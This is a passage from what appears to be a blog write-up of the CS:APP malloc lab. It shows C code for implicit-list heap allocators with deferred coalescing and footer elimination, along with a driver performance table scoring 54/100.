{</span><br><span class="line">        <span class="type">void</span>* old_bp = bp;</span><br><span class="line">        PUT(HDRP(bp), PACK(asize + ALIGNMENT, <span class="number">1</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(asize + ALIGNMENT, <span class="number">1</span>));</span><br><span class="line">        bp = NEXT_BLKP(bp);</span><br><span class="line">        PUT(HDRP(bp), PACK(osize - asize, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(osize - asize, <span class="number">0</span>));</span><br><span class="line">        </span><br><span class="line">        coalesce(bp);</span><br><span class="line">        <span class="keyword">return</span> old_bp;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (osize &gt;= asize) {</span><br><span class="line">        <span class="keyword">return</span> bp;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">        <span class="type">void</span>* new_bp = mm_malloc(size);</span><br><span class="line">        <span class="keyword">if</span> (new_bp == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memcpy</span>(new_bp, bp, osize);</span><br><span class="line">        mm_free(bp);</span><br><span class="line">        <span class="keyword">return</span> new_bp;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>The naive version gets a score of... 54. Too bad isn't it?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">trace  valid  util     ops      secs  Kops</span><br><span class="line"> 0       yes   99%    5694  0.004138  1376</span><br><span class="line"> 1       yes   99%    5848  0.003870  1511</span><br><span class="line"> 2       yes   99%    6648  0.006039  1101</span><br><span class="line"> 3       yes  100%    5380  0.004667  1153</span><br><span class="line"> 4       yes   66%   14400  0.000043338028</span><br><span class="line"> 5       yes   91%    4800  0.004471  1073</span><br><span class="line"> 6       yes   92%    4800  0.004170  1151</span><br><span class="line"> 7       yes   55%   12000  0.062290   193</span><br><span class="line"> 8       yes   51%   24000  0.208311   115</span><br><span class="line"> 9       yes   27%   14401  0.027274   528</span><br><span class="line">10       yes   30%   14401  0.000727 19817</span><br><span class="line">11       yes   56%   57716  0.960618    60</span><br><span class="line">12       yes   78%  100000  1.945745    51</span><br><span class="line">13       yes   99%   20000  0.000753 26553</span><br><span class="line">14       yes   71%  200400  0.107901  1857</span><br><span class="line">15       yes   58%    6495  0.013861   469</span><br><span class="line">Total          73%  496983  3.354877   148</span><br><span class="line"></span><br><span class="line">Perf index = 44 (util) + 10 (thru) = 54/100</span><br></pre></td></tr></table></figure>
<p><strong>Implicit + Deferred Coalesce + No Footer</strong></p>
<p>Our first trial to optimize the naive version is to add deferred
coalesce and eliminate footers for allocated blocks.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"mm.h"</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">"memlib.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">team_t</span> team = {</span><br><span class="line">    <span class="comment">/* Team name */</span></span><br><span class="line">    <span class="string">"Goodbye"</span>,</span><br><span class="line">    <span class="comment">/* First member's full name */</span></span><br><span class="line">    <span class="string">"Sulley"</span>,</span><br><span class="line">    <span class="comment">/* First member's email address */</span></span><br><span class="line">    <span class="string">"sulley@cs.cmu.edu"</span>,</span><br><span class="line">    <span class="comment">/* Second member's full name (leave blank if none) */</span></span><br><span class="line">    <span class="string">"AnotherSulley"</span>,</span><br><span class="line">    <span class="comment">/* Second member's email address (leave blank if none) */</span></span><br><span class="line">    <span class="string">"anothersulley@cs.cmu.edu"</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">/* single word (4) or double word (8) alignment */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DWORD 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWORD 4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* rounds up to the nearest multiple of DWORD */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALIGN(size) (((size) + (DWORD-1)) &amp; ~0x7)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Aligned size_t */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_T_SIZE (ALIGN(sizeof(size_t)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Extend heap by this amount */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHUNKSIZE (1&lt;&lt;12)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Return max */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX(x, y) ((x) &gt; (y) ? (x) : (y))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Pack a size and allocated bits into a word */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PACK(size, alloc_prev, alloc) ((size) | (alloc_prev) | (alloc))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Read and write a double word at address p */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET(p)      (*(unsigned int*)(p))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUT(p, val) (*(unsigned int*)(p) = (val))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Read the size and allocated fields from address p */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_SIZE(p)       (GET(p) &amp; ~0x7)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_ALLOC(p)      (GET(p) &amp; 0x1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_ALLOC_PREV(p) (GET(p) &amp; 0x2)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Given block ptr, compute the address of its header and footer */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HDRP(bp)  ((char *)(bp) - SWORD)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FTRP(bp)  ((char *)(bp) + GET_SIZE(HDRP(bp)) - DWORD)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Given block ptr bp, compute address of next and previous qblocks */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NEXT_BLKP(bp) ((char *)(bp) + GET_SIZE(HDRP(bp)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREV_BLKP(bp) ((char *)(bp) - GET_SIZE(((char *)(bp) - DWORD)))</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span>* heap_listp;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span>* <span class="title function_">coalesce</span><span class="params">(<span class="type">void</span> *bp)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">size_t</span> prev_alloc = GET_ALLOC_PREV(HDRP(bp));</span><br><span class="line">    <span class="type">size_t</span> next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">    <span class="type">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (prev_alloc &amp;&amp; next_alloc) {</span><br><span class="line">        <span class="keyword">return</span> bp;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (prev_alloc &amp;&amp; !next_alloc) {</span><br><span class="line">        size += GET_SIZE(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">        PUT(HDRP(bp), PACK(size, <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(size, <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!prev_alloc &amp;&amp; next_alloc) {</span><br><span class="line">        bp = PREV_BLKP(bp);</span><br><span class="line">        size += GET_SIZE(HDRP(bp));</span><br><span class="line">        PUT(HDRP(bp), PACK(size, GET_ALLOC_PREV(HDRP(bp)), <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(size, GET_ALLOC_PREV(HDRP(bp)), <span class="number">0</span>));</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">        size += GET_SIZE(HDRP(PREV_BLKP(bp))) + GET_SIZE(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">        bp = PREV_BLKP(bp);</span><br><span class="line">        PUT(HDRP(bp), PACK(size, GET_ALLOC_PREV(HDRP(bp)), <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(size, GET_ALLOC_PREV(HDRP(bp)), <span class="number">0</span>));</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span>* <span class="title function_">find_fit_first_hit_deferred</span><span class="params">(<span class="type">size_t</span> asize)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">void</span>* bp = heap_listp;</span><br><span class="line">    <span class="type">void</span>* next;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (GET_SIZE(HDRP(bp)) &gt; <span class="number">0</span>) {</span><br><span class="line">        <span class="keyword">if</span> (!GET_ALLOC(HDRP(bp))) {</span><br><span class="line">            <span class="keyword">if</span> (asize &lt;= GET_SIZE(HDRP(bp))) </span><br><span class="line">                <span class="keyword">return</span> bp;</span><br><span class="line">            next = NEXT_BLKP(bp);</span><br><span class="line">            <span class="keyword">if</span> (!GET_ALLOC(HDRP(next))) {</span><br><span class="line">                bp = coalesce(next);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        bp = NEXT_BLKP(bp);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span>* <span class="title function_">find_fit_better_hit_deferred</span><span class="params">(<span class="type">size_t</span> asize)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">void</span>* bp = heap_listp;</span><br><span class="line">    <span class="type">void</span>* best_bp = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> best_size = <span class="number">0</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">size_t</span> iteration = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (GET_SIZE(HDRP(bp)) &gt; <span class="number">0</span>) {</span><br><span class="line">        <span class="keyword">if</span> (!GET_ALLOC(HDRP(bp))) {</span><br><span class="line">            <span class="keyword">if</span> (!GET_ALLOC(HDRP(NEXT_BLKP(bp)))) {</span><br><span class="line">                bp = coalesce(NEXT_BLKP(bp));</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            }</span><br><span class="line">            <span class="keyword">if</span> (asize &lt;= GET_SIZE(HDRP(bp))) {</span><br><span class="line">                best_bp = bp;</span><br><span class="line">                best_size = GET_SIZE(HDRP(bp));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        bp = NEXT_BLKP(bp);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (best_bp == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; iteration &amp;&amp; GET_SIZE(HDRP(bp)) &gt; <span class="number">0</span>) {</span><br><span class="line">        <span class="comment">// Coalesce</span></span><br><span class="line">        <span class="keyword">while</span> (!GET_ALLOC(HDRP(NEXT_BLKP(bp)))) {</span><br><span class="line">            bp = coalesce(NEXT_BLKP(bp));</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Check if it's better</span></span><br><span class="line">        ++i;</span><br><span class="line">        <span class="keyword">if</span> (!GET_ALLOC(HDRP(bp)) &amp;&amp; asize &lt;= GET_SIZE(HDRP(bp)) &amp;&amp; GET_SIZE(HDRP(bp)) &lt; best_size) {</span><br><span class="line">            best_bp = bp;</span><br><span class="line">            best_size = GET_SIZE(HDRP(bp));</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Find next free block</span></span><br><span class="line">        bp = NEXT_BLKP(bp);</span><br><span class="line">        <span class="keyword">while</span> (GET_ALLOC(HDRP(bp)) &amp;&amp; GET_SIZE(HDRP(bp)) &gt; <span class="number">0</span>)</span><br><span class="line">            bp = NEXT_BLKP(bp);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> best_bp;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span>* <span class="title function_">find_fit</span><span class="params">(<span class="type">size_t</span> asize)</span></span><br><span class="line">{</span><br><span class="line">    <span class="comment">//void* bp = find_fit_first_hit_deferred(asize);</span></span><br><span class="line">    <span class="type">void</span>* bp = find_fit_better_hit_deferred(asize);</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">set_nextblock_alloc_prev</span><span class="params">(<span class="type">void</span>* bp, <span class="type">size_t</span> value)</span></span><br><span class="line">{</span><br><span class="line">    bp = NEXT_BLKP(bp);</span><br><span class="line">    PUT(HDRP(bp), PACK(GET_SIZE(HDRP(bp)), value, GET_ALLOC(HDRP(bp))));</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">place</span><span class="params">(<span class="type">void</span>* bp, <span class="type">size_t</span> asize)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">size_t</span> csize = GET_SIZE(HDRP(bp));</span><br><span class="line">    <span class="keyword">if</span> (csize &gt;= asize + <span class="number">2</span> * DWORD) {</span><br><span class="line">        PUT(HDRP(bp), PACK(asize, GET_ALLOC_PREV(HDRP(bp)), <span class="number">1</span>));</span><br><span class="line">        bp = NEXT_BLKP(bp);</span><br><span class="line">        PUT(HDRP(bp), PACK(csize - asize, <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(csize - asize, <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> {</span><br><span class="line">        PUT(HDRP(bp), PACK(csize, GET_ALLOC_PREV(HDRP(bp)), <span class="number">1</span>));</span><br><span class="line">        set_nextblock_alloc_prev(bp, <span class="number">1</span> &lt;&lt; <span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span>* <span class="title function_">extend_heap</span><span class="params">(<span class="type">size_t</span> words)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> *bp;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line"></span><br><span class="line">    size = (words % <span class="number">2</span>) ? (words + <span class="number">1</span>) * SWORD : words * SWORD;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">long</span>)(bp = mem_sbrk(size)) == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> prev_alloc = GET_ALLOC_PREV(HDRP(bp));</span><br><span class="line">    PUT(HDRP(bp), PACK(size, prev_alloc, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(bp), PACK(size, prev_alloc, <span class="number">0</span>));</span><br><span class="line">    PUT(HDRP(NEXT_BLKP(bp)), PACK(<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">return</span> coalesce(bp);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * mm_init - initialize the malloc package.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">mm_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> ((heap_listp = mem_sbrk(<span class="number">4</span> * SWORD)) == (<span class="type">void</span> *)<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    PUT(heap_listp, <span class="number">0</span>);</span><br><span class="line">    PUT(heap_listp + <span class="number">1</span> * SWORD, PACK(DWORD, <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="number">1</span>));</span><br><span class="line">    PUT(heap_listp + <span class="number">2</span> * SWORD, PACK(DWORD, <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="number">1</span>));</span><br><span class="line">    PUT(heap_listp + <span class="number">3</span> * SWORD, PACK(<span class="number">0</span>, <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="number">1</span>));</span><br><span class="line">    heap_listp += <span class="number">2</span> * SWORD;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (extend_heap(CHUNKSIZE / SWORD) == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * mm_malloc - Allocate a block by incrementing the brk pointer.</span></span><br><span class="line"><span class="comment"> *     Always allocate a block whose size is a multiple of the alignment.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">mm_malloc</span><span class="params">(<span class="type">size_t</span> size)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">size_t</span> asize;</span><br><span class="line">    <span class="type">size_t</span> extendsize;</span><br><span class="line">    <span class="type">char</span>* bp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">3</span> * SWORD)</span><br><span class="line">        asize = <span class="number">2</span> * DWORD;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        asize = DWORD * ((size + SWORD + DWORD - <span class="number">1</span>) / DWORD);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((bp = find_fit(asize)) != <span class="literal">NULL</span>) {</span><br><span class="line">        place (bp, asize);</span><br><span class="line">        <span class="keyword">return</span> bp;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    extendsize = MAX(asize, CHUNKSIZE);</span><br><span class="line">    <span class="keyword">if</span> ((bp = extend_heap(extendsize / SWORD)) == <span class="literal">NULL</span>)</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">NULL</span>; </span><br><span class="line">    place(bp, asize);</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_free - Freeing a block does nothing.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">mm_free</span><span class="params">(<span class="type">void</span> *bp)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class="line">    <span class="type">size_t</span> prev_alloc = GET_ALLOC_PREV(HDRP(bp));</span><br><span class="line">    PUT(HDRP(bp), PACK(size, prev_alloc, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(bp), PACK(size, prev_alloc, <span class="number">0</span>));</span><br><span class="line">    </span><br><span class="line">    set_nextblock_alloc_prev(bp, <span class="number">0</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_realloc - Implemented simply in terms of mm_malloc and mm_free</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">mm_realloc</span><span class="params">(<span class="type">void</span>* bp, <span class="type">size_t</span> size)</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span> (bp == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> mm_malloc(size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span>) {</span><br><span class="line">        mm_free(bp);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> osize = GET_SIZE(HDRP(bp));</span><br><span class="line">    <span class="type">size_t</span> asize = size &lt;= <span class="number">3</span> * SWORD ? <span class="number">2</span> * DWORD : DWORD * ((size + SWORD + DWORD - <span class="number">1</span>) / DWORD);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (osize &gt;= asize + <span class="number">2</span> * DWORD) {</span><br><span class="line">        <span class="type">void</span>* old_bp = bp;</span><br><span class="line">        PUT(HDRP(bp), PACK(asize, GET_ALLOC_PREV(HDRP(bp)), <span class="number">1</span>));</span><br><span class="line">        bp = NEXT_BLKP(bp);</span><br><span class="line">        PUT(HDRP(bp), PACK(osize - asize, <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        PUT(FTRP(bp), PACK(osize - asize, <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        set_nextblock_alloc_prev(bp, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> old_bp;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (osize 